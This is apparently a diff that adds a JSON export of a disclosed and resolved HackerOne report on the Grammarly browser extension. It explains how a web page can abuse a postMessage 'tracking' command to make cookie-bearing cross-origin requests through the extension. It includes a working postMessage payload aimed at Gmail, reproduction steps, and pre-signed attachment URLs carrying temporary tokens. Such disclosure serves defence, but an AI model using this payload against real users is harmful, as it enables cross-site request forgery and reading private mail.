@@ -1,0 +1,154 @@
+{
+  "id": 389108,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zODkxMDg=",
+  "url": "https://hackerone.com/reports/389108",
+  "title": "Handling of `tracking` command allows making arbitrary blind requests with user's cookies from Grammarly Extension's origin",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2018-08-01T01:12:27.640Z",
+  "submitted_at": "2018-08-01T01:12:27.640Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "metnew",
+    "url": "/metnew",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/jdthvavflc07lpt5x37qarrub1jt/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 22746,
+    "url": "https://hackerone.com/superhuman",
+    "handle": "superhuman",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/23p3otm27f7hjxfsde7xx0ol3jhf/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/23p3otm27f7hjxfsde7xx0ol3jhf/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Superhuman (formerly Grammarly)",
+      "twitter_handle": "",
+      "website": "https://superhuman.com/",
+      "about": "Superhuman (formerly Grammarly) unites Grammarly, Superhuman Mail, Coda, and Go with AI to unlock superhuman potential in everyone."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2019-08-01T15:59:18.760Z",
+  "bug_reporter_agreed_on_going_public_at": "2019-07-27T17:33:33.768Z",
+  "team_member_agreed_on_going_public_at": "2019-08-01T15:59:18.219Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## **Summary:**\n\nAttacker could trigger Grammarly extension's `gnar._fetch` command using a crafted page to perform XHR with cookies and any configurational params to any cross-origin resource.\n\n## **Description:** \n\n### Page could Init Grammarly popup editor [no user gesture, helper]\n\nEvents have `isTrusted` property, which allows to determinate, whether current event is trusted(initiated by user). Grammarly popup editor could be initiated by page.\n\nAs I understood: injected content script could successfully emit events to background page only if popup was initiated earlier. \nThat means, attacker needs to initiate the popup somehow to communicate with background page through injected content script.\n\nNot sure about the root cause of this behavior. Probably, because popup is created by background page origin, that's why background page becomes accessible after this.\n\n## Sending commands to Grammarly content script\n\nActive page could send commands to injected Grammarly content script using `window.postMessage`.\n\nCommand structure:\n``` js\nwindow.postMessage({\n    grammarly: true,\n    action: 'tracking',\n    method: 'gnar._fetch',\n    props: {}\n    params: {}\n}, \"*\")\n```\n\n## Commands handling in injected content script\n\nGrammarly content script \"parses\" commands using this snippet:\n\n``` js\nfunction Z(e) {\n    var t, n = e.action;\n    ... \n    \"tracking\" === n && e.method && g.call(e.method, e.param, e.props)\n    ...\n}\n```\n\n`tracking` commands are later passed to this snippet:\n``` js\nf.emitBackground(\"tracking-call\", {\n    msg: e, // command's \"method\" field\n    data: t // command's \"props\" + \"params\" fields\n }, s)\n```\n\nThis `f.emitBackground` sends event to background page.\n\n### Commands handling in extension's background page\n\nThe extension uses next snippet to handle `tracking` commands from content script:\n\n``` js\nfunction w(e, t) { // t = params + props\n    var n, a = o(e.split(\".\"), 2), // a = command's \"method\" field splitted by dot into array\n        c = a[0],\n        s = a[1];\n    if (\"gnar\" === c) \n        if (p.tracker.gnar)\n            if (\"track\" === s) {\n                var u = o(t, 2),\n                    l = u[0], // \n                    f = u[1];\n                p.tracker.gnar.track(r({\n                    eventName: g.gnarAppName + \"/\" + l // something not discovered yet \n                }, f))\n            } else\n                p.tracker.gnar[s] ? (n = p.tracker.gnar)[s].apply(n, i(t)) : b.error(\n                    \"gnar client does not have method '\" + s + \"' for '\" +\n                    e + \"' in runMessage\");\n    else b.error(\"gnar client not available for '\" + e + \"' in runMessage\");\n    else b.error(\"unrecognized'\" + e + \"' in runMessage \")\n}\n```\n\n#### `p.tracker.gnar`\n\nThat's an object with next structure:\n```js\n{\n    _batchId: 8,\n    _client: \"chromeExt\",\n    _clientVersion: \"14.858.1756\",\n    _containerIdManager: t {primaryStorage: t, secondaryStorages: Array(3), _logger: t, _metric: e,  _cacheSuccessTimeoutMillis: 1000, …},\n    _eventsUrl: \"https://gnar.grammarly.com/events\",\n    _fetch: ƒ (),\n    _instanceId: \"nxIwqgPE\",\n    _isTest: false,\n    _isUserReady: true,\n    _liteUrl: \"https://gnar.grammarly.com/lite\",\n    _logger: t {name: \"gnar\", level: 2, context: e, appender: ƒ},\n    _metric: t {name: \"gnar\", timersSink: ƒ, countersSink: ƒ, _fetch: ƒ, _sendTimeout: 7500, …},\n    _queue: [],\n    _storePingTimestamp: true,\n    _userId: \"701014151\n}\n```\n\nAdditionally, it has a set of methods.\n\n> I guess `p.tracker.gnar` controls reporting telemetry events to Grammarly.\n\n#### Attacker-controllable function call\n\n``` js\np.tracker.gnar[s] ? (n = p.tracker.gnar)[s].apply(n, i(t))\n```\n\n`s` = that's the second part of command's \"method\" field. E.g. `\"method\": \"hello.grammarly\"` -> s = 'grammarly'\n`t` = `params` and `props`\n\nThis snippet could be rewritten as:\n\n``` js\nGNAR[methodsMethod].apply(GNAR,  toArray(paramsAndProps))\n```\n\n#### `p.tracker.gnar`s `.constructor` and methods\n\n`p.tracker.gnar` object could be overwritten using `.constructor`  and `.setUser` methods those allow changing some `p.tracker.gnar` properties. \n\n`p.tracker.gnar`s `.constructor`\n```\nfunction e(e, t, n, r, o, i, c, s) { // Attacker controls e and t params + non-listed params using `setUser`\n            void 0 === s && (s = !1),\n            this._client = t,\n            this._clientVersion = n,\n            this._fetch = r,\n            this._containerIdManager = o,\n            this._logger = i,\n            this._metric = c,\n            this._storePingTimestamp = s,\n            this._instanceId = a.alphanumeric(8),\n            this._batchId = 0,\n            this._isUserReady = !1,\n            this._queue = [],\n            this._eventsUrl = e + \"/events\",\n            this._liteUrl = e + \"/lite\",\n            this._pingMaybe()\n        }\n```\n\n##### `gnar.setUser`/`gnar._execQueue` / `gnar._send` / `gnar._doSend` / `gnar._enqueue` \n\n`p.tracker.gnar` has a set of interesting methods like `setUser`. Grammarly extension uses `setUser` to invalidate session. \n\n``` js\na[\"session-invalidate\"] = function (e, t, n, r, o) {\n        ...\n        s.call(\"gnar.setUser\", i, c)\n        ...\n}\n```\n\n> I'm not sure, but looks like calling this method with crafted payload may lead to incorrect userId in telemetry. \n\nTeam probably should know how much powerful listed above funcstions are. \n\n#### `_fetch`\n\n`p.tracker.gnar` has `_fetch` property which points to `fetch` function.\nMore interesting is that, it's a polyfill, not a native function.\n\n> I guess this polyfill isn't compliable to WHATWG fetch, because it allows making requests to `data:/chrome-extension:/` origins.\n\nThat means, it's possible to call `fetch()` with attacker's params from the extension.\n\n```\np.tracker.gnar_fetch.apply(p.tracker.gnar, [\"FetchURL\", \"FetchParams\"])\n```\n\nPage has to call `window.postMessage` with next object to call `fetch` from the extension\n```\nx = window.top.postMessage({\n    grammarly: true,\n    action: 'tracking',\n    method: 'gnar._fetch',\n    props: { // FetchParams\n        method: 'GET',\n        headers: {\n            'Content-Type': 'application/json'\n        }\n    },\n    param: 'https://mail.google.com/mail/u/0/#inbox' // <FetchURL>\n}, \"*\")\n```\n\n#### XHR + cookies\n\nGrammarly extension has permissions to access all URLs and cookies from all origins. \nGrammarly makes all XHR requests with cookies -> it's possible for attacker to make blind requests with cookies to any origin.\n\n> (except `chrome://`, however, `chrome-extension://` is allowed because of polyfill for `fetch`).\n\n> More details in \"Impact\" section.\n\n## Browsers Verified In:\n\nChrome 70.0.3508.0 Canary\nChrome 68.0.3440.75 Stable\nGrammarly: 14.858.1756\n\n## Steps To Reproduce:\n\n### Change user's name in Grammarly\n1. Open `app-grammarly-csfr.html`\n2. Page makes request to `https://auth.grammarly.com/v3/user` to change your name to \"Anonymous User\" \n\n### GET Gmail as proof\n1. Open Grammarly extension debug page in Chrome\n2. Open `get-request-to-gmail.html`\n3. Open \"Network\" tab in the debug page\n4. Note that extension made a GET request to Gmail (with cookies)\n5. Open request preview\n6. Note that request includes your gmail content\n7.  That means, it's possible to initiate requests with cookies to any origin. Web applications without \"direct CSRF protection\" (e.g. `hidden` field with some value, not token in cookies ) are controllable by attacker.\n\n## Supporting Material/References:\n\n1. Screencast for POST to`https://auth.grammarly.com/v3/user`. [1st PoC]\n2. Screencast to prove that Grammarly makes requests with cookies to cross-origin domains. [2nd PoC] \n\n> I didn't know a good CSRF target, so I've recorded a second screencast with Gmail and GET request. I think that's enough to prove the vulnerability.\n\n## Impact\n\n## Universal CSRF\n> Actually, \"Universal CSRF\" isn't a correct definition 😉. But I think it correctly expresses impact of the vulnerability.\n\nAttacker could trigger Grammarly extension's `gnar._fetch` command  using crafted page to perform XHR with any configurational params to any origin [without user gesture]. \n\nWeb applications without good protection against CSRF (`hidden` field in form, not cookies/origin check/etc.) are vulnerable to CSRF. \n\nPage could made **any number of blind requests through Grammarly extension with cookies**. \n\n## Overwrite `p.tracker.gnar` and call any method of this object\n\n`p.tracker.gnar` has a set of interesting methods like `setUser`. Grammarly extension uses `setUser` to invalidate session.\n\n> I assume, calling this methods leads to sending invalid telemetry data to Grammarly.\n\n## Possible UXSS via data manipulation\n\nAttacker could overwrite `p.tracker.gnar` with arbitrary data. However, `postMessage` doesn't allow to send [non-clonable objects](https://developer.mozilla.org/en-US/docs/Web/API/Web_Workers_API/Structured_clone_algorithm).\n\nAttacker could call something like:\n\n```\nAnythingClonable.apply(Object, [AnythingClonable])\n```\n\n> I didn't test this with `File/Blob/FileList` non-clonnable objects. However, I think it's not possible to turn the snippet above into XSS.\n \n> P.S: Grammarly, sorry for typos/mistakes if any. Your extension has some bugs at `hackerone.com` domain.",
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 327032,
+      "file_name": "grammarly-ucsrf-username.mp4",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/327/032/467b124971903936f000ca14379c97eddc0d9b1a/grammarly-ucsrf-username.mp4?response-content-disposition=attachment%3B%20filename%3D%22grammarly-ucsrf-username.mp4%22%3B%20filename%2A%3DUTF-8%27%27grammarly-ucsrf-username.mp4&response-content-type=video%2Fmp4&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQR3GTHQFV%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T152201Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEBwaCXVzLXdlc3QtMiJIMEYCIQDYu9r85%2FmA%2FOwQXCrGqqGzP1olVwp5xXxLyjxIhiiEpAIhAOj2n7EsJkAoT2Ilhn7A0NEOPWwz4M7rQWHTwO4vyxcYKroFCOX%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igw7uZBzHkR2f8exvuMqjgUEJGc5J00ina2AYp35Td0xO%2F%2BmdFxrbnvMOxvTbfMFYwEJlJb2TKwNbl78OdctmpBYd6Yu%2BRc7h7%2BOl1kkRpny%2BWcKZBWsr%2BC8mBr9k4yQwAGKn9RgJqLCzRgP6Rr%2BEmGT%2FmqHlMPE0rAivz4XbTGgytxCkWWVOzGhU1llYs1JCIMwakGDMJZXtPZzC649axfhzHzAnSEruB76boS45uIDBkJdc0k%2BVWQJnEDfJbNDQDrVkuSVZ1OpJWFP%2FqLvUmrhzSv25tSyMJq4SbY5ee8%2FqYyX3%2BGJDi5JngASq6qg%2FIN7LVoTBmtBMt2Iub5agzc0NyuS0BnjyDgWgwIslV70GYLlsBGuULnTjew97X0nOuptEkvyGAfebuZ48nvuULzEUCAHgTRjQ2ZtPPblZfPZPSZ6gWp1jRudR4s8f01lohW48CzCFOvPYIfPXoXRhVqwxCihaegRhDKC9cw9VGXXI1QfsTVUYq94kODH4vmmhj7v06JHytT5vU133eyFkPc3QIuF58Qc0FQslUOwpq58Tx5mNt9XOiHGZdyVuUzxqEod1xFAuX%2Bu4dJr0HZ0Od6v1zrT9i7qbEWc3FcuE9B8cM736bxierenveAQvn1fQIv63EtVbydZuoBXZawMNY7Q7zU9jQbFP5phny5K9N0FIeLISYm52wY%2B8cmlRPrzt9EP2W%2Fij4ZjrPVLETrkNl4CUh1zuAg3Qw5BqTx28hmElPKzMJG0emqmPxlzHX4Fp24nS%2FDZqGylbWQys68AevC1CBa4f6RRHefO7JwNS3K%2F%2FjCK%2FOMjja%2FtyaL0y2AFK73QEfXYNx7WU9mdkp%2BZaL%2BpsFJ1z125QSWQR5tEbLMs9O8IzrHW2iqF3%2FtocfMwjLr8zwY6sAEilY0tuh7Sue4qZU59OxLfRZCBSCizJClwMxWF73lWBVllTfZGsA8ZtD3nBTKssvwv2orXrzhhYtswe7O1w2BoAIHcvH9HxdP6zg%2FTBrsd06k9crqSYXz1xKYO6ylTW50Qaw1IwM9zQpcXdX5OgNwPh9kzroZ%2F5%2B2cDW76qRqVFZlvC2NGdy7hSRd9dKjYSWKCundZ2X0ym06GyxA17sRx3XCjsRfqXwnDZO2Iw68uEw%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=49a1e8d809d8b97c923c181c5b91a3b7e54c0413559997916bca645adc7c111c",
+      "file_size": 843252,
+      "type": "video/mp4",
+      "moderated": null
+    },
+    {
+      "id": 327034,
+      "file_name": "grammarly-gmail-get-as-proof.mp4",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/327/034/33c5d7b689653dd16536ca9f4d84e73fc317c5ab/grammarly-gmail-get-as-proof.mp4?response-content-disposition=attachment%3B%20filename%3D%22grammarly-gmail-get-as-proof.mp4%22%3B%20filename%2A%3DUTF-8%27%27grammarly-gmail-get-as-proof.mp4&response-content-type=video%2Fmp4&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQR3GTHQFV%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T152201Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEBwaCXVzLXdlc3QtMiJIMEYCIQDYu9r85%2FmA%2FOwQXCrGqqGzP1olVwp5xXxLyjxIhiiEpAIhAOj2n7EsJkAoT2Ilhn7A0NEOPWwz4M7rQWHTwO4vyxcYKroFCOX%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igw7uZBzHkR2f8exvuMqjgUEJGc5J00ina2AYp35Td0xO%2F%2BmdFxrbnvMOxvTbfMFYwEJlJb2TKwNbl78OdctmpBYd6Yu%2BRc7h7%2BOl1kkRpny%2BWcKZBWsr%2BC8mBr9k4yQwAGKn9RgJqLCzRgP6Rr%2BEmGT%2FmqHlMPE0rAivz4XbTGgytxCkWWVOzGhU1llYs1JCIMwakGDMJZXtPZzC649axfhzHzAnSEruB76boS45uIDBkJdc0k%2BVWQJnEDfJbNDQDrVkuSVZ1OpJWFP%2FqLvUmrhzSv25tSyMJq4SbY5ee8%2FqYyX3%2BGJDi5JngASq6qg%2FIN7LVoTBmtBMt2Iub5agzc0NyuS0BnjyDgWgwIslV70GYLlsBGuULnTjew97X0nOuptEkvyGAfebuZ48nvuULzEUCAHgTRjQ2ZtPPblZfPZPSZ6gWp1jRudR4s8f01lohW48CzCFOvPYIfPXoXRhVqwxCihaegRhDKC9cw9VGXXI1QfsTVUYq94kODH4vmmhj7v06JHytT5vU133eyFkPc3QIuF58Qc0FQslUOwpq58Tx5mNt9XOiHGZdyVuUzxqEod1xFAuX%2Bu4dJr0HZ0Od6v1zrT9i7qbEWc3FcuE9B8cM736bxierenveAQvn1fQIv63EtVbydZuoBXZawMNY7Q7zU9jQbFP5phny5K9N0FIeLISYm52wY%2B8cmlRPrzt9EP2W%2Fij4ZjrPVLETrkNl4CUh1zuAg3Qw5BqTx28hmElPKzMJG0emqmPxlzHX4Fp24nS%2FDZqGylbWQys68AevC1CBa4f6RRHefO7JwNS3K%2F%2FjCK%2FOMjja%2FtyaL0y2AFK73QEfXYNx7WU9mdkp%2BZaL%2BpsFJ1z125QSWQR5tEbLMs9O8IzrHW2iqF3%2FtocfMwjLr8zwY6sAEilY0tuh7Sue4qZU59OxLfRZCBSCizJClwMxWF73lWBVllTfZGsA8ZtD3nBTKssvwv2orXrzhhYtswe7O1w2BoAIHcvH9HxdP6zg%2FTBrsd06k9crqSYXz1xKYO6ylTW50Qaw1IwM9zQpcXdX5OgNwPh9kzroZ%2F5%2B2cDW76qRqVFZlvC2NGdy7hSRd9dKjYSWKCundZ2X0ym06GyxA17sRx3XCjsRfqXwnDZO2Iw68uEw%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=ec17a8dcc3b52ac40803d4e9841d064fadbfcbaecde62c4a3ecd8de446c99d09",
+      "file_size": 1628434,
+      "type": "video/mp4",
+      "moderated": null
+    },
+    {
+      "id": 327036,
+      "file_name": "app-grammarly-csfr.html",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/327/036/3e603eb3104e711215f08184bf72c7cd184c048a/app-grammarly-csfr.html?response-content-disposition=attachment%3B%20filename%3D%22app-grammarly-csfr.html%22%3B%20filename%2A%3DUTF-8%27%27app-grammarly-csfr.html&response-content-type=application%2Foctet-stream&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQR3GTHQFV%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T152201Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEBwaCXVzLXdlc3QtMiJIMEYCIQDYu9r85%2FmA%2FOwQXCrGqqGzP1olVwp5xXxLyjxIhiiEpAIhAOj2n7EsJkAoT2Ilhn7A0NEOPWwz4M7rQWHTwO4vyxcYKroFCOX%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igw7uZBzHkR2f8exvuMqjgUEJGc5J00ina2AYp35Td0xO%2F%2BmdFxrbnvMOxvTbfMFYwEJlJb2TKwNbl78OdctmpBYd6Yu%2BRc7h7%2BOl1kkRpny%2BWcKZBWsr%2BC8mBr9k4yQwAGKn9RgJqLCzRgP6Rr%2BEmGT%2FmqHlMPE0rAivz4XbTGgytxCkWWVOzGhU1llYs1JCIMwakGDMJZXtPZzC649axfhzHzAnSEruB76boS45uIDBkJdc0k%2BVWQJnEDfJbNDQDrVkuSVZ1OpJWFP%2FqLvUmrhzSv25tSyMJq4SbY5ee8%2FqYyX3%2BGJDi5JngASq6qg%2FIN7LVoTBmtBMt2Iub5agzc0NyuS0BnjyDgWgwIslV70GYLlsBGuULnTjew97X0nOuptEkvyGAfebuZ48nvuULzEUCAHgTRjQ2ZtPPblZfPZPSZ6gWp1jRudR4s8f01lohW48CzCFOvPYIfPXoXRhVqwxCihaegRhDKC9cw9VGXXI1QfsTVUYq94kODH4vmmhj7v06JHytT5vU133eyFkPc3QIuF58Qc0FQslUOwpq58Tx5mNt9XOiHGZdyVuUzxqEod1xFAuX%2Bu4dJr0HZ0Od6v1zrT9i7qbEWc3FcuE9B8cM736bxierenveAQvn1fQIv63EtVbydZuoBXZawMNY7Q7zU9jQbFP5phny5K9N0FIeLISYm52wY%2B8cmlRPrzt9EP2W%2Fij4ZjrPVLETrkNl4CUh1zuAg3Qw5BqTx28hmElPKzMJG0emqmPxlzHX4Fp24nS%2FDZqGylbWQys68AevC1CBa4f6RRHefO7JwNS3K%2F%2FjCK%2FOMjja%2FtyaL0y2AFK73QEfXYNx7WU9mdkp%2BZaL%2BpsFJ1z125QSWQR5tEbLMs9O8IzrHW2iqF3%2FtocfMwjLr8zwY6sAEilY0tuh7Sue4qZU59OxLfRZCBSCizJClwMxWF73lWBVllTfZGsA8ZtD3nBTKssvwv2orXrzhhYtswe7O1w2BoAIHcvH9HxdP6zg%2FTBrsd06k9crqSYXz1xKYO6ylTW50Qaw1IwM9zQpcXdX5OgNwPh9kzroZ%2F5%2B2cDW76qRqVFZlvC2NGdy7hSRd9dKjYSWKCundZ2X0ym06GyxA17sRx3XCjsRfqXwnDZO2Iw68uEw%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=b37338c7fa0b6a1027339586e85d96362885893485ab56ef6fe17314c10cdebd",
+      "file_size": 1039,
+      "type": "text/html",
+      "moderated": null
+    },
+    {
+      "id": 327037,
+      "file_name": "get-request-to-gmail.html",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/327/037/50ce0ebc9c51f2be2c7914fd304f72431c56377a/get-request-to-gmail.html?response-content-disposition=attachment%3B%20filename%3D%22get-request-to-gmail.html%22%3B%20filename%2A%3DUTF-8%27%27get-request-to-gmail.html&response-content-type=application%2Foctet-stream&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQR3GTHQFV%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T152201Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEBwaCXVzLXdlc3QtMiJIMEYCIQDYu9r85%2FmA%2FOwQXCrGqqGzP1olVwp5xXxLyjxIhiiEpAIhAOj2n7EsJkAoT2Ilhn7A0NEOPWwz4M7rQWHTwO4vyxcYKroFCOX%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igw7uZBzHkR2f8exvuMqjgUEJGc5J00ina2AYp35Td0xO%2F%2BmdFxrbnvMOxvTbfMFYwEJlJb2TKwNbl78OdctmpBYd6Yu%2BRc7h7%2BOl1kkRpny%2BWcKZBWsr%2BC8mBr9k4yQwAGKn9RgJqLCzRgP6Rr%2BEmGT%2FmqHlMPE0rAivz4XbTGgytxCkWWVOzGhU1llYs1JCIMwakGDMJZXtPZzC649axfhzHzAnSEruB76boS45uIDBkJdc0k%2BVWQJnEDfJbNDQDrVkuSVZ1OpJWFP%2FqLvUmrhzSv25tSyMJq4SbY5ee8%2FqYyX3%2BGJDi5JngASq6qg%2FIN7LVoTBmtBMt2Iub5agzc0NyuS0BnjyDgWgwIslV70GYLlsBGuULnTjew97X0nOuptEkvyGAfebuZ48nvuULzEUCAHgTRjQ2ZtPPblZfPZPSZ6gWp1jRudR4s8f01lohW48CzCFOvPYIfPXoXRhVqwxCihaegRhDKC9cw9VGXXI1QfsTVUYq94kODH4vmmhj7v06JHytT5vU133eyFkPc3QIuF58Qc0FQslUOwpq58Tx5mNt9XOiHGZdyVuUzxqEod1xFAuX%2Bu4dJr0HZ0Od6v1zrT9i7qbEWc3FcuE9B8cM736bxierenveAQvn1fQIv63EtVbydZuoBXZawMNY7Q7zU9jQbFP5phny5K9N0FIeLISYm52wY%2B8cmlRPrzt9EP2W%2Fij4ZjrPVLETrkNl4CUh1zuAg3Qw5BqTx28hmElPKzMJG0emqmPxlzHX4Fp24nS%2FDZqGylbWQys68AevC1CBa4f6RRHefO7JwNS3K%2F%2FjCK%2FOMjja%2FtyaL0y2AFK73QEfXYNx7WU9mdkp%2BZaL%2BpsFJ1z125QSWQR5tEbLMs9O8IzrHW2iqF3%2FtocfMwjLr8zwY6sAEilY0tuh7Sue4qZU59OxLfRZCBSCizJClwMxWF73lWBVllTfZGsA8ZtD3nBTKssvwv2orXrzhhYtswe7O1w2BoAIHcvH9HxdP6zg%2FTBrsd06k9crqSYXz1xKYO6ylTW50Qaw1IwM9zQpcXdX5OgNwPh9kzroZ%2F5%2B2cDW76qRqVFZlvC2NGdy7hSRd9dKjYSWKCundZ2X0ym06GyxA17sRx3XCjsRfqXwnDZO2Iw68uEw%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=6bc1dbd91655814c9a19ec9341a3e324f045e3acfa6467e4aece696a78aeca87",
+      "file_size": 717,
+      "type": "text/html",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2019-08-26T17:33:33.931Z",
+  "allow_singular_disclosure_after": -211499307.60141546,
+  "singular_disclosure_allowed": true,
+  "vote_count": 201,
+  "voters": [
+    "orange303",
+    "tsyogesh40",
+    "daehee",
+    "awhacken",
+    "n1m0",
+    "d0xing",
+    "dee-see",
+    "p1stachios",
+    "balerion",
+    "mashoud1122",
+    "and 191 more..."
+  ],
+  "severity": {
+    "rating": "critical",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 3577,
+    "asset_type": "OTHER",
+    "asset_identifier": "Grammarly Browser Extensions",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
